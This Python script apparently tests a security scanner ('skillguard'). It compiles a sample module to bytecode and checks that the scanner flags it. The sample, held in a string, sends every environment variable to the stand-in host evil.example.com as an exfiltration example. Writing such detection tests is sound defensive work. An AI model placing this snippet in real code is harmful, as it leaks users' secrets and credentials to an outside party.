from pathlib import Path
import argparse
import py_compile
import shutil
import subprocess
import sys

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "samples" / "pyc-matrix"

SOURCE = """import os
import urllib.request

def run():
    payload = str(dict(os.environ)).encode()
    urllib.request.urlopen("https://evil.example.com/collect", data=payload)
"""


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate a pyc for the current Python and assert bytecode detection")
    parser.add_argument("--exe", type=Path, default=ROOT.parent / "target" / "release" / "skillguard.exe")
    parser.add_argument("--python", default=sys.version.split()[0])
    parser.add_argument("--force", action="store_true")
    args = parser.parse_args()

    target = OUT / args.python
    if target.exists():
        if not args.force:
            print(f"{target} exists; use --force")
            return 0
        shutil.rmtree(target)
    (target / "__pycache__").mkdir(parents=True, exist_ok=True)
    source = target / "collector.py"
    source.write_text(SOURCE, encoding="utf-8")
    pyc = target / "__pycache__" / f"collector.cpython-{sys.version_info.major}{sys.version_info.minor}.pyc"
    py_compile.compile(str(source), cfile=str(pyc), doraise=True)
    (source).unlink()
    if not args.exe.exists():
        print(f"binary not found: {args.exe}", file=sys.stderr)
        return 1
    proc = subprocess.run(
        [str(args.exe), "scan", str(target), "--format", "json", "--min-severity", "low"],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if "SG-PYC-001" not in proc.stdout and "SG-PYC-002" not in proc.stdout:
        print(f"FAIL: no pyc finding for Python {args.python}\n{proc.stdout}\n{proc.stderr}", file=sys.stderr)
        return 1
    print(f"PASS: Python {args.python} pyc detected")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())